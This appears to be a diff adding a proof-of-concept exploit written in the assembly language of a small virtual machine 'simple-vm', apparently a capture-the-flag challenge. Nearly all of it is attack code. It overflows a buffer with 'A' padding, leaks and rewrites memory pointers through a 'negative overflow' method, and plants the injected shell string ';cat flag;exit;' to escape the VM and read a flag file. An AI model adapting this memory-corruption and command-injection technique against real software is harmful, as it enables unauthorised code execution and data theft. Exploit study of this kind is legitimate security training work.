@@ -1,0 +1,103 @@
+# PoC
+# Usage
+#
+#  $ ./compiler examples/test.in ; ./simple-vm examples/test.raw
+#
+#
+
+		goto run
+	:code
+		store #1, "TESTTEST\n"
+		print_str #1
+		store #1, "TEST"
+		print_str #1
+		store #2, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+		store #3, "HHHHHHHHHHHHHHHHGGGGGGGGGGGGGGGG"
+		concat #2, #2, #3
+#		print_str #2
+		store #5, 0x6000
+		store #6, 0x800
+		memcpy #5, #2, #6
+
+		store #1, "\n"
+		print_str #1
+
+		store #5, 0x6220
+		peek #6, #5
+#		store #5, 0x3e7d60
+#		sub #6, #6, #5
+#		print_int #6
+
+		store #1, "\n"
+		print_str #1
+
+		store #5, 0x6224
+		peek #7, #5
+#		print_int #7
+
+		print_str #1
+
+#
+#	Method 1: negative overflow
+#
+		store #1, 0x6220
+		peek #4, #1
+		store #5, 0x8000
+		store #6, 0x920
+		store #7, "\n"
+		store #1, 0x74
+		store #2, 1
+:loop
+		sub #1, #1, #2
+#		print_int #1
+#		print_str #7
+		jmpnz repeat
+		sub #4, #4, #6
+
+		store #6, 0x6220
+		poke #4, #6
+		print_int #4
+		print_str #7
+
+		store #9, 256
+		div #4, #4, #9
+		store #6, 0x6221
+		poke #4, #6
+		print_int #4
+		print_str #7
+
+		div #4, #4, #9
+		store #6, 0x6222
+		poke #4, #6
+		print_int #4
+		print_str #7
+
+		store #1, 0x0
+		store #2, 0x1818
+		sub #1, #1, #2
+		print_int #1
+		store #2, 0x6220
+		store #3, 8
+		memcpy #1, #2, #3
+
+		store #4, 0x200
+		store #1, ";cat flag;exit;\n"
+		memcpy #4, #1, #4
+
+		exit
+	:code_end
+
+	:run
+		store #2, code
+		store #3, code_end
+		sub #3, #3, #2
+
+		store #1, 0x5000
+		store #2, code
+		memcpy #1, #2, #3
+
+		goto 0x5000
+
+	:repeat
+		sub #4, #4, #5
+		goto loop
